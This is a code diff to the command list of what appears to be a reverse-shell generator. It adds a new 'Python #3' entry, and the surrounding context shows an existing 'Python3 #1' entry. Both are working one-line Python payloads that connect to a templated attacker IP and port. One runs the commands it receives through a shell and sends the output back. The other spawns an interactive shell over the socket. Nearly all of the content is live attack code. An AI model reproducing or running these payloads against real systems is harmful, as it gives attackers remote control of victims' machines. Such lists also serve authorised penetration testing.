@@ -252,6 +252,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "Python #3",
+            "command": "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{port}));exec(\"while True:\\n cmd=s.recv(1024)\\n if not cmd: break\\n try:\\n  out=subprocess.check_output(cmd,shell=True)\\n except Exception as e:\\n  out=str(e).encode()\\n s.send(out)\")'",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "Python3 #1",
             "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
             "meta": ["linux", "mac"]
